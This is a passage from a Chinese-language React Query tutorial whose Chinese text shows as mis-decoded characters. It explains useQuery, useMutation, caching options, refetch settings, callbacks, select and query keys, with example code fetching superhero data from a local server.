useQuery('super-hero', getHeros) if (isLoading) { return &lt;h2&gt;Loading...&lt;/h2&gt; } if (isError) { return &lt;h2&gt;{error.message}&lt;/h2&gt; } return ( &lt;&gt; &lt;h2&gt;RQ Super Heros Page&lt;/h2&gt; {data?.data.map((hero) =&gt; ( &lt;div key={hero.id}&gt;{hero.name}&lt;/div&gt; ))} &lt;/&gt; )} é€™å€‹ hook æœƒå›å‚³ä¸€äº›å¸¸ç”¨çš„ç‹€æ…‹ï¼ŒåŒ…å« isLoadingã€isError ç­‰ç­‰ï¼Œä½ ç›´æ¥æ‹¿å‡ºä¾†ç”¨å°±å¯ä»¥äº†ï¼Œå¾ˆæ–¹ä¾¿ã€‚ useMutation æœ€åŸºæœ¬çš„ç”¨æ³•åªè¦æ˜¯æœƒä¿®æ”¹åˆ° Sever è³‡æ–™çš„è«‹æ±‚ï¼Œåƒæ˜¯ POSTã€DELETE ç­‰ç­‰ä½ éƒ½éœ€è¦ç”¨é€™ä¸€å€‹ hookã€‚ï¼ˆç•¢ç«Ÿéƒ½ç”¨ã€Œmutationã€é€™å€‹å­—äº†ï¼Œå°±ä»£è¡¨ä½ æƒ³ã€Œæ”¹è®Šã€æŸäº›æ±è¥¿ï¼‰ useMutation æœƒæ¥æ”¶å…©å€‹åƒæ•¸ï¼š fetcher ä½ è¦ call api çš„é‚£å€‹ function config ç”¨ä¾†èª¿æ•´é…ç½®çš„ ä¸‹é¢æ˜¯ä¸€å€‹ç°¡å–®çš„ç¤ºç¯„ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import { Link, useHistory } from 'react-router-dom/cjs/react-router-dom.min'import { useMutation, useQuery } from 'react-query'import axios from 'axios'import { useState } from 'react'const addHero = (payload) =&gt; axios.post('http://localhost:4000/superheroes', payload)export const RQSuperHeroesPage = () =&gt; { // ä½¿ç”¨ useMutation const postQuery = useMutation(addHero) const [formValue, setFormValue] = useState({ name: '', alterEgo: '' }) const handleChange = (type, value) =&gt; { switch (type) { case 'name': setFormValue((oldState) =&gt; ({ ...oldState, name: value })) break case 'alterEgo': setFormValue((oldState) =&gt; ({ ...oldState, alterEgo: value })) break default: break } } const handleAddButton = () =&gt; { // ç”¨ .mutate ä¾†ç™¼å‡ºè«‹æ±‚ã€‚é€™è£¡å‚³çš„æ±è¥¿æœƒè‡ªå‹•å‚³å…¥ addHero postQuery.mutate(formValue) } return ( &lt;div&gt; &lt;input type='text' value={formValue.name} onChange={(event) =&gt; handleChange('name', event.target.value)} /&gt; &lt;input type='text' value={formValue.alterEgo} onChange={(event) =&gt; handleChange('alterEgo', event.target.value)} /&gt; &lt;button onClick={handleAddButton}&gt;Add&lt;/button&gt; &lt;/div&gt; )} React Query vs å‚³çµ± useEffectåœ¨å­¸ä¹‹å‰å¯ä»¥å…ˆçœ‹ä¸€ä¸‹å‰å¾Œå·®ç•°é•·ä»€éº¼æ¨£ï¼Œçœ‹å®Œä½ æ‡‰è©²æœƒè¦ºå¾— React Query ä¹¾æ·¨ä¸”ç›´è¦ºå¾ˆå¤šã€‚ useEffect ç‰ˆæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132333435363738import { useState, useEffect } from 'react'import axios from 'axios'export const SuperHeroesPage = () =&gt; { const [isLoading, setIsLoading] = useState(true) const [errorMessage, setErrorMessage] = useState('') const [data, setData] = useState([]) useEffect(() =&gt; { axios .get('http://localhost:4000/superheroes1') .then((res) =&gt; { setData(res.data) setIsLoading(false) }) .catch((error) =&gt; { setErrorMessage(error.message) setIsLoading(false) }) }, []) if (isLoading) { return &lt;h2&gt;Loading...&lt;/h2&gt; } if (errorMessage) { return &lt;h2&gt;{errorMessage}&lt;/h2&gt; } return ( &lt;&gt; &lt;h2&gt;Super Heroes Page&lt;/h2&gt; {data.map((hero) =&gt; { return &lt;div key={hero.id}&gt;{hero.name}&lt;/div&gt; })} &lt;/&gt; )} React Query ç‰ˆæœ¬ï¼š 12345678910111213141516171819202122232425import axios from 'axios'import { useQuery } from 'react-query'const getHeros = () =&gt; axios.get('http://localhost:4000/superheroes1')export const RQSuperHeroesPage = () =&gt; { const { isLoading, data, isError, error } = useQuery('super-hero', getHeros) if (isLoading) { return &lt;h2&gt;Loading...&lt;/h2&gt; } if (isError) { return &lt;h2&gt;{error.message}&lt;/h2&gt; } return ( &lt;&gt; &lt;h2&gt;RQ Super Heros Page&lt;/h2&gt; {data?.data.map((hero) =&gt; ( &lt;div key={hero.id}&gt;{hero.name}&lt;/div&gt; ))} &lt;/&gt; )} å¯ä»¥æ³¨æ„åˆ°å…©å€‹é»ï¼š è±ªç„¡ç–‘å•ï¼Œè¡Œæ•¸å°‘äº†å¾ˆå¤šã€‚ ä¸ç”¨è‡ªå·±è™•ç† loadingã€errorã€data ç›¸é—œçš„ stateã€‚React Query çš„ useQuery æœƒè‡ªå‹•åœ¨å…§éƒ¨ç®¡ç†é€™äº›ç‹€æ…‹ ä¸çŸ¥é“ä½ å¿ƒå‹•äº†å—ï¼ŒReact Query å¾ˆé¦™å“¦ï½ Cache - cacheTimeReact Query æœ‰å¿«å–æ©Ÿåˆ¶ï¼ŒæœƒæŠŠç¬¬ä¸€æ¬¡æŠ“åˆ°çš„å…§å®¹å…ˆå­˜èµ·ä¾†ï¼Œä¸¦ä¸”åœ¨ä¸‹ä¸€æ¬¡éœ€è¦çš„æ™‚å€™æ‹¿å‡ºä¾†ç”¨ï¼Œåƒé€™æ¨£ï¼š æ³¨æ„ç¬¬ä¸€æ¬¡çš„æ™‚å€™æœƒæœ‰ Loadingï¼Œç¬¬äºŒæ¬¡çš„æ™‚å€™å°±æ²’æœ‰äº†ï¼Œé€™å€‹å°±æ˜¯å¿«å–ï¼Œç›®çš„æ˜¯ç‚ºäº†è®“ä½¿ç”¨è€…ä¸ç”¨æ¯æ¬¡éƒ½è¦ç­‰å¾…è®€å–çš„æ™‚é–“ã€‚ é€™æ™‚å€™æ‡‰è©²æœƒæœ‰ä¸€å€‹ç–‘å•ï¼š å•Šæˆ‘å¦‚æœ Server çš„è³‡æ–™æœ‰æ›´æ–°å‹’ï¼Ÿåªå¾å¿«å–æ‹¿çš„è©±ä¸å°±æœƒæ˜¯èˆŠè³‡æ–™å—ï¼ å•çš„å¥½ï¼React Query ç•¶ç„¶æœ‰è€ƒæ…®åˆ°é€™ä¸€é»ï¼Œæ‰€ä»¥å¯¦éš›ä¸Šä¸¦ä¸æ˜¯åªæœ‰å¾å¿«å–æ‹¿è³‡æ–™è€Œå·²ï¼Œå®ƒé‚„æœƒåœ¨èƒŒå¾Œå¹«ä½ é‡æ–°æŠ“ä¸€æ¬¡æ–°çš„è³‡æ–™ã€‚æˆ‘å€‘å¯ä»¥æ‰“é–‹ network ä¾†çœ‹å°±æœƒç™¼ç¾ç¢ºå¯¦æ˜¯é€™æ¨£å­ï¼š é›–ç„¶ç•«é¢ä¸Šä¸æœƒå‡ºç¾ Loadingï¼Œä½†å¯ä»¥çœ‹åˆ°èƒŒå¾Œé‚„æ˜¯ç™¼äº†ä¸€å€‹è«‹æ±‚å»æŠ“å–æœ€æ–°çš„è³‡æ–™ï¼Œä¸¦è‡ªå‹•æ›´æ–°åˆ°ç•«é¢ä¸Šã€‚ React Query çš„å¿«å–é è¨­æœƒä¿ç•™äº”åˆ†é˜ï¼Œå¦‚æœä½ ä¸å–œæ­¡çš„è©±å¯ä»¥é€é config å»æ”¹ï¼š 1useQuery('super-hero', getHeros, { cacheTime: 5000 }) // å¿«å–ä¿ç•™ 5 ç§’ Cache - staleTimeå‰é¢æœ‰ä»‹ç´¹äº†ä¸€é»å¿«å–æ©Ÿåˆ¶ï¼Œæˆ‘å€‘çŸ¥é“ React Query æœƒå„ªå…ˆæ‹¿å¿«å–çš„è³‡æ–™ä¾†åšé¡¯ç¤ºï¼Œæ¥è‘—åœ¨å¾èƒŒæ™¯é‡æ–°æŠ“ä¸€æ¬¡æœ€æ–°è³‡æ–™ã€‚åˆ°é€™é‚Šä¸çŸ¥é“ä½ æœƒä¸æœƒæœ‰ä¸€å€‹ç–‘å•ï¼š æ—¢ç„¶éƒ½æœ‰å¿«å–äº†ï¼Œæœ‰å¿…è¦æ¯ä¸€æ¬¡éƒ½åœ¨èƒŒæ™¯é‡æŠ“ä¸€æ¬¡å—ï¼Ÿï¼ˆå‡è¨­å·²ç¶“çŸ¥é“æŸäº›è³‡æ–™ä¸å¸¸æ›´æ–°ï¼‰ å¦‚æœä½ æœ‰é€™å€‹å›°æ“¾çš„è©±ï¼ŒstaleTime å°±æ˜¯ç”¨ä¾†è§£æ±ºé€™å€‹å•é¡Œçš„ã€‚ æˆ‘å€‘å¯ä»¥é€é staleTime ä¾†è¨­å®šä¸€å€‹å¿«å–çš„ã€Œæ–°é®®åº¦ã€æœ‰å¤šä¹…ï¼Ÿ åŸæœ¬çš„é è¨­å€¼æ˜¯ 0ï¼Œä¹Ÿå°±æ˜¯èªªåœ¨æˆ‘å€‘å„²å­˜å¿«å–çš„é‚£ä¸€åˆ»èµ·å°±ä¸æ–°é®®äº†ï¼Œå› æ­¤æ¯ä¸€æ¬¡å¾å¿«å–æ‹¿è³‡æ–™æ™‚éƒ½æœƒå¾èƒŒæ™¯å»æŠ“å–æœ€æ–°çš„è³‡æ–™ã€‚ ä¸å¤ªæ‡‚çš„è©±å¯ä»¥ä¾†çœ‹å€‹ç¯„ä¾‹ï¼Œæˆ‘å€‘æŠŠ staleTime è¨­ç‚º 15 ç§’ï¼š 1useQuery('super-hero', getHeros, { staleTime: 15 * 1000 }) // å¿«å–çš„æ–°é®®åº¦æœ‰ 15 ç§’ å¾åœ–ä¸­å¯ä»¥ç™¼ç¾å¹¾ä»¶äº‹ï¼š ç¬¬ä¸€æ¬¡é€²å…¥é é¢æ™‚å› ç‚ºé‚„æ²’æœ‰å¿«å–ï¼Œæ‰€ä»¥æœƒç™¼å‡ºä¸€å€‹è«‹æ±‚å»æ‹¿è³‡æ–™ï¼Œæ¥è‘—å†å¿«å–èµ·ä¾†ã€‚ ä¸‹æ¬¡å†é€²å…¥åŒä¸€å€‹é é¢æ™‚ï¼Œæ²’æœ‰åƒå‰é¢ä¸€æ¨£é™¤äº†æ‹¿å¿«å–è³‡æ–™ä»¥å¤–ï¼Œé‚„æœƒåœ¨èƒŒæ™¯å»ç™¼è«‹æ±‚æ‹¿å‡ºæœ€æ–°çš„è³‡æ–™ï¼Œè€Œæ˜¯å…ˆçœ‹é€™å€‹å¿«å–æ˜¯å¦é‚„æ–°é®®ï¼Ÿå¦‚æœæ˜¯ï¼Œå°±ä¸æœƒå†é¡å¤–ç™¼è«‹æ±‚å»æ‹¿è³‡æ–™ã€‚ æ‰€ä»¥æˆ‘å€‘å¯ä»¥é€éé€™ç¨®æ–¹å¼æ±ºå®šå¤šä¹…å¾Œè©²å»æ‹¿æœ€æ–°çš„è³‡æ–™ï¼Œé€™å€‹å°±æ˜¯ staleTime çš„ç”¨é€”ã€‚ refetchOnWindowFocusReact Query æœ‰ä¸€å€‹å¾ˆå²å®³çš„åŠŸèƒ½æ˜¯ã€Œç•¶ä½ å¾åˆ¥çš„è¦–çª—æˆ–åˆ†é åˆ‡å›ä¾†æ™‚ï¼Œæœƒè‡ªå‹•è§¸ç™¼ refetch çš„å‹•ä½œã€ï¼Œåƒè€ƒä¸‹åœ–ï¼š èƒ½çœ‹åˆ°æ¯æ¬¡åˆ‡å›ä¾†çš„æ™‚å€™éƒ½æœƒåœ¨èƒŒæ™¯ç™¼è«‹æ±‚å»æ‹¿æœ€æ–°çš„è³‡æ–™ã€‚ é€™å€‹åŠŸèƒ½å« refetchOnWindowFocusï¼Œé è¨­å€¼ç‚º trueã€‚å¦‚æœä¸å–œæ­¡çš„è©±ä¸€æ¨£å¯ä»¥é€é config ä¾†è¨­å®šï¼š 1useQuery('super-hero', getHeros, { refetchOnWindowFocus: false }) // é—œé–‰ refetch çš„åŠŸèƒ½ refetchIntervalé€™å€‹å°±æ¯”è¼ƒç›´è¦ºä¸€é»äº†ï¼Œçœ‹åˆ° Interval æ‡‰è©²å°±èƒ½å¤§è©²çŒœåˆ°æ˜¯ã€Œå¤šä¹…å¾Œè¦è‡ªå‹• refetchã€ã€‚ é€™å€‹åŠŸèƒ½é è¨­æ˜¯æ²’æœ‰æ‰“é–‹çš„ï¼Œæ‰€ä»¥æˆ‘å€‘è¦é€é config ä¾†è¨­å®šï¼š 1useQuery('super-hero', getHeros, { refetchInterval: 1000 }) // è¨­å®šç‚º 1 ç§’ æ‰€ä»¥ç¾åœ¨æ¯éä¸€ç§’é˜å°±æœƒå»æŠ“ä¸€æ¬¡æœ€æ–°è³‡æ–™ï¼š å¦‚æœä½ æƒ³åšçš„æ›´å¾¹åº•ä¸€é»ï¼Œè®“ user åœ¨ä¸åœ¨ç›®å‰é é¢æ™‚ä¹ŸæœƒåŸ·è¡Œ refetch çš„è©±ï¼ˆé è¨­ä¸æœƒï¼‰ï¼Œå¯ä»¥åŠ ä¸Š refetchIntervalInBackground é€™å€‹è¨­å®šï¼š 1234useQuery('super-hero', getHeros, { refetchInterval: 1000, refetchIntervalInBackground: true // &lt;- åŠ ä¸Šé€™å€‹}) é€™æ¨£ä½ çš„é é¢å°±æœƒè®Šå¾—éå¸¸ real timeï¼Œæˆ‘è¦ºå¾—åœ¨æŸäº›æƒ…å¢ƒä¸‹å¯èƒ½æœƒå¾ˆæœ‰å¹«åŠ©ã€‚ æƒ³åœ¨äº‹ä»¶ç™¼ç”Ÿæ™‚æ‰å»å‘¼å« APIï¼šenabledå‰é¢ä»‹ç´¹çš„éƒ½æ˜¯åœ¨å…ƒä»¶ onMount çš„æ™‚å€™è‡ªå‹•å»å‘¼å« API æ‹¿è³‡æ–™ï¼Œä¸éæœ‰äº›æ™‚å€™æˆ‘å€‘å¯èƒ½ä¸æƒ³åœ¨ä¸€é–‹å§‹å°±æŠ“è³‡æ–™ï¼Œè€Œæ˜¯åœ¨ç‰¹å®šäº‹ä»¶ç™¼ç”Ÿæ™‚æ‰å»å‘¼å«ï¼Œä¾‹å¦‚ï¼šæŒ‰ä¸‹æŒ‰éˆ•çš„æ™‚å€™ã€‚ é€™å€‹æ™‚å€™å¯ä»¥é€™æ¨£åšï¼š 123const { refetch } = useQuery('super-hero', getHeros, { enabled: false })return &lt;button onClick={refetch}&gt;Fetch Data&lt;/button&gt; é€™é‚Šåšäº†å…©ä»¶äº‹ï¼Œç¬¬ä¸€æ˜¯å…ˆæŠŠ enabled è¨­ç‚º falseï¼Œé¿å…åœ¨å…ƒä»¶ onMount æ™‚å»å‘¼å« APIï¼Œæ¥è‘—å†æŠŠ useQuery å›å‚³çš„ refetch è·ŸæŒ‰éˆ•çš„ onClick äº‹ä»¶åšç¶å®šï¼Œå°±å¯ä»¥åšå‡ºé€™æ¨£çš„æ•ˆæœï¼š èƒ½çœ‹åˆ°ç¾åœ¨é€²å…¥é é¢æ™‚ä¸æœƒç›´æ¥å»å‘¼å« APIï¼Œè€Œæ˜¯è¦ç­‰åˆ°æˆ‘å€‘ã€ŒæŒ‰ä¸‹æŒ‰éˆ•ã€ä»¥å¾Œæ‰æœƒå»å‘¼å«ï¼Œå®Œç¾ï¼ ä¸éè¦æ³¨æ„é€™å€‹æ–¹æ³•ä¸€æ¨£æœƒä¿ç•™å¿«å–æ©Ÿåˆ¶ï¼ˆå‰é¢æœ‰ä»‹ç´¹ï¼Œå¿˜è¨˜çš„è©±æ‹‰å›å»çœ‹ï¼‰ï¼Œæ‰€ä»¥å¦‚æœä½ çš„ Loading ç‹€æ…‹æ˜¯ç”¨ isLoading ä¾†æ§åˆ¶çš„è©±ï¼Œåœ¨æŒ‰ä¸‹ç¬¬äºŒæ¬¡æŒ‰éˆ•æ™‚å°±ä¸æœƒå‡ºç¾ Loading ç•«é¢ï¼Œå› ç‚º isLoading åªæœƒåœ¨æ²’æœ‰å¿«å–è³‡æ–™çš„æƒ…æ³ä¸‹æ‰æœ‰æ©Ÿæœƒå‡ºç¾ trueã€‚ ä»¥é€™å€‹ä¾‹å­ä¾†çœ‹çš„è©±ï¼Œåœ¨æ¯ä¸€æ¬¡æŒ‰ä¸‹æŒ‰éˆ•çš„æ™‚å€™éƒ½é¡¯ç¤º Loading æœƒæ¯”è¼ƒåˆç†ï¼Œæ‰€ä»¥æˆ‘å€‘é€™æ™‚å€™è¦æ‹¿çš„ flag æ‡‰è©²è¦æ˜¯ isFetchingï¼Œè€Œä¸æ˜¯ isLoadingã€‚ 12345678910export const RQSuperHeroesPage = () =&gt; { // âœ… if (isFetching) { return &lt;h2&gt;Loading&lt;/h2&gt; } // âŒ if (isLoading) { return &lt;h2&gt;Loading&lt;/h2&gt; }} åªæ˜¯æƒ³æé†’ä¸€ä¸‹ï¼Œæ³¨æ„ä¸è¦å¯«éŒ¯äº†ï¼ æ³¨æ„äº‹é …é›–ç„¶å‰é¢èªªæŠŠ enabled è¨­ç‚º false çš„è©±å¯ä»¥é¿å… onMount æ™‚å»æ‰“ API é€™ä»¶äº‹ï¼Œä½†å…¶å¯¦å®ƒä¸¦ä¸å–®ç´”åªæ˜¯é€™æ¨£è€Œå·²ï¼Œå®ƒé‚„æœƒï¼š å–æ¶ˆ refetch çš„åŠŸèƒ½ å–æ¶ˆ refetch çš„åŠŸèƒ½ å–æ¶ˆ refetch çš„åŠŸèƒ½ ä¹Ÿå°±æ˜¯èªªæ‰€æœ‰è·Ÿ refetch ç›¸é—œçš„åŠŸèƒ½éƒ½æœƒå¤±æ•ˆï¼Œä¾‹å¦‚ï¼šrefetchOnWindowFocusã€refetchInterval ç­‰ç­‰ä¹‹é¡çš„ã€‚ åœ¨é€™ç¨®æƒ…æ³ä¸‹æƒ³è¦åš refetch çš„è©±å°±åªèƒ½é€é useQuery å›å‚³çš„ refetch ä¾†è™•ç†ã€‚ä½ å¿…é ˆè‡ªå·±å»è§¸ç™¼é€™å€‹ function æ‰æœƒè§¸ç™¼ refetch çš„è¡Œç‚ºã€‚ æ‰€ä»¥é€™é‚Šæƒ³é‡æ¸… enabled çš„å¯¦éš›ç”¨é€”ï¼Œä¹Ÿé †æ‰‹ç•™ä¸€æ®µå®˜æ–¹æ–‡ä»¶å°é€™å€‹ config çš„æ•˜è¿°ï¼š Set this to false to disable automatic refetching when the query mounts or changes query keys. To refetch the query, use the refetch method returned from the useQuery instance. Defaults to true. side effect çš„å¥½æœ‹å‹ï¼šonSuccess / onErroræ‰“ API çš„æ™‚å€™é™¤äº†ç¢ºä¿æˆ‘å€‘æœ‰æ‹¿åˆ°è³‡æ–™ä»¥å¤–ï¼Œæˆ‘å€‘å¯èƒ½é‚„æœƒæƒ³åšä¸€äº› side effectï¼Œä¾‹å¦‚èªªï¼šéŒ¯èª¤ç™¼ç”Ÿæ™‚è‡ªå‹•å°å›é¦–é ã€åˆ—è¡¨æ›´æ–°æ™‚è‡ªå‹•æ›´æ–°æ»¾è»¸ä½ç½®ç­‰ç­‰ã€‚ åœ¨æ²’æœ‰ React Query ä¹‹å‰ä½ æ‡‰è©²éƒ½æœƒé€é useEffect ä¾†åšé€™äº›äº‹ï¼Œä¸éç¾åœ¨ä½ å¯ä»¥é€é onSuccess å’Œ onError ä¾†è™•ç†ã€‚ ä¾†çœ‹å€‹ä¾‹å­ï¼Œæˆ‘è‡ªå·±é‚„è »å¸¸åšçš„ä¸€ç¨® effect æ˜¯ç™¼ç”ŸéŒ¯èª¤æ™‚è‡ªå‹•å°å›é¦–é ï¼Œæ‰€ä»¥åœ¨ React Query è£¡å¯ä»¥é€™æ¨£åšï¼š 12345678export const RQSuperHeroesPage = () =&gt; { const history = useHistory() const onError = (error) =&gt; { console.log('error', error) history.push('/') // å°å›é¦–é  } const { isFetching, data, isError, error } = useQuery('super-hero', getHeros, { onSuccess })} å¯¦éš›æ•ˆæœï¼š é€™é‚Šå…ˆæé†’ä¸€ä¸‹ï¼Œå› ç‚ºæˆ‘æ²’æœ‰ç‰¹åˆ¥èª¿æ•´è¨­å®šï¼Œæ‰€ä»¥é è¨­æœƒåœ¨å¤±æ•—å¾Œå˜—è©¦å››æ¬¡ï¼Œç›´åˆ°å››æ¬¡éƒ½å¤±æ•—çš„è©±æ‰æœƒé€²å…¥ onError è™•ç†ï¼Œæ‰€ä»¥æ‰æœƒçœ‹åˆ° console å™´äº†å››æ¬¡ GET éŒ¯èª¤ã€‚ ä½†ç¸½ä¹‹èƒ½çœ‹åˆ°æˆ‘å€‘æˆåŠŸé‹ç”¨äº† onError ä¾†è™•ç†é‡æ–°å°å‘çš„ side effectã€‚ æœ€å¾Œå†æé†’ä¸€ä»¶å°äº‹ï¼Œå°±æ˜¯ onSuccess å’Œ onError éƒ½æœƒè‡ªå‹•æ¥æ”¶ä¸€å€‹åƒæ•¸ï¼Œæ‰€ä»¥æœ‰éœ€è¦çš„è©±å¯ä»¥æ‹¿å‡ºä¾†ç”¨ï¼š 123456const onError = (error) =&gt; { console.log('error', error)}const onSuccess = (data) =&gt; { console.log('data', data)} å¾Œç«¯çš„è³‡æ–™å¤ªé«’äº†ï¼Œè®“æˆ‘ select ä¸€ä¸‹é€™æ‡‰è©²æ˜¯ 90% çš„å‰ç«¯éƒ½æœƒç¢°åˆ°çš„å•é¡Œï¼Œå¦‚æœæ˜¯å¯« useEffect çš„è©±ä½ é€šå¸¸æœƒåœ¨ setState ä»¥å‰å…ˆæŠŠè³‡æ–™æ•´ç†å¥½åœ¨å¯«é€²å»ã€‚ é‚£åœ¨ React Query æ€éº¼åšå‘¢ï¼Ÿä½ å¯ä»¥ç”¨ select é€™å€‹ config ä¾†è™•ç†ï¼Œä¾†çœ‹å€‹ç¯„ä¾‹ã€‚ å‡è¨­åŸæœ¬å›å‚³çš„è³‡æ–™é•·é€™æ¨£ï¼š 1234567891011121314151617;[ { id: 1, name: 'Batman HoHoHo', alterEgo: 'Bruce Wayne' }, { id: 2, name: 'Superman', alterEgo: 'Clark Kent' }, { id: 3, name: 'Wonder Woman', alterEgo: 'Princess Diana' }] å¦‚æœæˆ‘åªéœ€è¦ç”± name çµ„æˆçš„ Arrayï¼Œæˆ‘å¯ä»¥é€™æ¨£å¯«ï¼š 123456const { data } = useQuery('super-hero', getHeros, { select: (response) =&gt; { const heroNames = response.data.map((hero) =&gt; hero.name) return heroNames }}) å¯«æˆé€™æ¨£ä»¥å¾Œ data å€¼å°±æœƒè®Šæˆé€™é‚Šçš„ heroNamesï¼Œè€Œä¸æ˜¯åŸæœ¬ axios çš„ responseã€‚ï¼ˆå‡è¨­ä½ æ˜¯ç”¨ axios çš„è©±ï¼‰ ä½ çš„ key è¨­å°äº†å—ï¼ŸæŠ“å– Detail è³‡æ–™æ™‚å¯èƒ½æœƒçŠ¯çš„éŒ¯å…¶å¯¦é€™é‚Šä¸»è¦æ˜¯æƒ³æé†’ useQuery ä¸­çš„ key çš„æ„ç¾©ï¼Œä½†æˆ‘è¦ºå¾—é€™å€‹éŒ¯èª¤æ‡‰è©²æœ€å¸¸ç™¼ç”Ÿåœ¨æŠ“ Detail è³‡æ–™çš„æ™‚å€™ï¼Œæ‰€ä»¥æ‰ç”¨é€™å€‹ä¾†ç•¶æ¨™é¡Œã€‚ æƒ³åƒä¸€ä¸‹ä½ æœ‰ä¸€å€‹åˆ—è¡¨ï¼Œæ¯ä¸€å€‹åˆ—è¡¨é»é€²å»ä»¥å¾Œå¯ä»¥çœ‹åˆ°ç´°ç¯€è³‡è¨Šï¼Œé‚£ä½ æœƒæ€éº¼å¯¦ä½œ detail çš„é é¢ï¼Ÿæ‡‰è©²ä¸å¤–ä¹éƒ½æ˜¯åƒé€™æ¨£å§ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041import axios from 'axios'import React from 'react'import { useQuery } from 'react-query'import { useHistory, useParams } from 'react-router-dom/cjs/react-router-dom.min'export const RQSuperHeroDetail = () =&gt; { // é€éè·¯ç”±è³‡è¨Šå–å¾— id const { id } = useParams() const history = useHistory() const getHeroDetail = () =&gt; axios.get('http://localhost:4000/superheroes/' + id) // ç”¨ useQuery æŠ“è³‡æ–™ const { data, isLoading, isFetching } = useQuery('super-hero-detail', getHeroDetail, { // æ•´ç†è³‡æ–™ select: (response) =&gt; { if (response.data) { return response.data } return null }, // éŒ¯èª¤è™•ç† onError: (error) =&gt; { history.goBack() } }) if (isLoading) { return &lt;h2&gt;Loading...&lt;/h2&gt; } if (data) { return ( &lt;div&gt; &lt;h2&gt;Id: {data.id}&lt;/h2&gt; &lt;h2&gt;Name: {data.name}&lt;/h2&gt; &lt;h2&gt;Alter Ego: {data.alterEgo}&lt;/h2&gt; &lt;/div&gt; ) } return null} çœ‹èµ·ä¾†æŒºåˆç†çš„å§ï¼Ÿä½†å…¶å¯¦é€™æ¨£å¯«æœƒæœ‰ä¸€å€‹å•é¡Œï¼Œæ³¨æ„é€™ä¸€æ®µï¼š 123useQuery('super-hero-detail', getHeroDetail, { /* ç•¥ */}) é€™é‚Šå°±å…ˆç›´æ¥èªªäº†ï¼Œå•é¡Œåœ¨æ–¼ keyã€‚ä¸éç‚ºä»€éº¼å‘¢ï¼Ÿæˆ‘å€‘å¯ä»¥å…ˆæ€è€ƒä¸€å€‹å•é¡Œï¼š /superheroes/1 /superheroes/2 /superheroes/3 â€¦ é€™å¹¾å€‹ request æ‹¿åˆ°çš„å›å‚³å€¼æœƒç›¸åŒå—ï¼Ÿç•¶ç„¶ä¸æœƒå§ï¼é‚£å¦‚æœéƒ½å­˜åŒä¸€å€‹ key æœƒç™¼ç”Ÿä»€éº¼äº‹ï¼Ÿæˆ‘å€‘ç›´æ¥ä¾†çœ‹çœ‹ï¼š å¯ä»¥çœ‹åˆ°ç¬¬ä¸€æ¬¡é»é€²å»çš„æ™‚å€™æœƒ React Query æœƒå»ºç«‹ä¸€å€‹å¿«å–ï¼Œä¸¦ä¸”ç”¨ [\"super-hero-detail\"] ä¾†ç•¶ä½œ key å„²å­˜ã€‚æ¥è‘—ç¬¬äºŒæ¬¡é€²å»çš„æ™‚å€™å› ç‚ºä¹Ÿæ˜¯ç”¨åŒä¸€å€‹ key ä¾†ç™¼è«‹æ±‚ï¼Œæ‰€ä»¥ React Query å°±æœƒå…ˆå¾ä¹‹å‰çš„å¿«å–ä¸­æ‹¿è³‡æ–™ï¼Œå†åˆ©ç”¨èƒŒæ™¯ refetch çš„æ–¹å¼ä¾†æ›´æ–°è³‡æ–™ã€‚ ä¹Ÿå› ç‚ºé€™æ¨£ï¼Œæ‰æœƒå‡ºç¾åˆ°æ˜æ˜é»çš„æ˜¯ç¬¬äºŒå€‹ï¼Œçµæœç•«é¢ä¸Šå»å…ˆé¡¯ç¤ºç¬¬ä¸€å€‹çš„è³‡è¨Šï¼Œæœ€å¾Œæ‰åˆ·æ–°æˆæ­£ç¢ºçš„å…§å®¹ã€‚ é€™å€‹å°±æ˜¯æ²’æ­£ç¢ºè¨­å®šå¥½ key çš„è©±æœƒç¢°åˆ°çš„å•é¡Œã€‚æˆ‘å€‘æ˜æ˜çŸ¥é“æ¯ä¸€ç­†é é¢çš„ detail è³‡æ–™ä¸€å®šæœƒä¸ä¸€æ¨£ï¼Œæ—¢ç„¶å¦‚æ­¤ï¼Œæ€éº¼å¯ä»¥æ‹¿å…¶ä»–é é¢çš„ detail è³‡æ–™ä¾†ç”¨å‘¢ï¼Ÿé€™æ¨£ä¸åˆç†ï¼Œæ‰€ä»¥æ¯ä¸€å€‹ detail æ‡‰è©²è¦æœ‰è‡ªå·±çš„ç¨ç«‹çš„å¿«å–æ‰å°ã€‚ é‚£è¦æ€éº¼è§£æ±ºå‘¢ï¼Ÿå…¶å¯¦å¾ˆç°¡å–®ï¼Œå°±æ˜¯å¹«æ¯å€‹ detail å»ºç«‹å„è‡ªçš„ key å°±å¥½äº†å˜›ï¼å¦‚æœçœ¼ç›å¤ å°–çš„è©±æ‡‰è©²æœƒæ³¨æ„åˆ°å…¶å¯¦ key çš„å€¼æ˜¯ç”¨ Array ä¾†å­˜çš„ï¼Œæ‰€ä»¥æˆ‘å€‘åªè¦æ”¹ç”¨é™£åˆ—çš„æ–¹å¼ä¾†è¨­å®šå°±å¥½äº†ï¼Œåƒé€™æ¨£ï¼š 123useQuery(['super-hero-detail', id], getHeroDetail, { /* ç•¥ */}) é€™æ¨£å­ React Query å°±æœƒæŠŠæ¯ä¸€å€‹ä¸åŒ id çš„è«‹æ±‚ç”¨ä¸åŒçš„ key ä¾†å„²å­˜ï¼Œå°±ä¸æœƒå†å‡ºç¾æ‹¿éŒ¯å¿«å–çš„å•é¡Œï¼š èƒ½çœ‹åˆ°ç¾åœ¨æ¯ä¸€å€‹ detail é é¢éƒ½æœ‰è‡ªå·±ç¨ç«‹çš„ keyï¼Œæ‰€ä»¥å°±ä¸æœƒå†å‡ºç¾æ‹¿éŒ¯å¿«å–çš„å•é¡Œï¼Œåªæœ‰åœ¨é€²åˆ°ç›¸åŒé é¢çš„æ™‚å€™æ‰æœƒï¼ˆå› ç‚ºç›¸åŒé é¢çš„ key æœƒä¸€æ¨£ï¼‰ã€‚ Dynamic Parallel fetchç°¡å–®ä¾†èªªï¼Œæœ‰ä¸€ç¨®æƒ…å¢ƒæ˜¯å¦³æƒ³åœ¨ä¸€å€‹é é¢åŒæ™‚ç™¼å‡ºå¤šå€‹è«‹æ±‚ï¼Œä½†ä½ åˆä¸çŸ¥é“å¯¦éš›ä¸Šæœƒéœ€è¦å¹¾å€‹çš„æ™‚å€™å°±å«åšã€ŒDynamic Parallel fetchã€ã€‚ å¦‚æœç¢°åˆ°é€™ç¨®æƒ…æ³çš„è©±å¯ä»¥åƒè€ƒ useQueries é€™å€‹ hookï¼Œé›–ç„¶æˆ‘å€‹äººæ›´åå¥½ç”¨ Promise.all 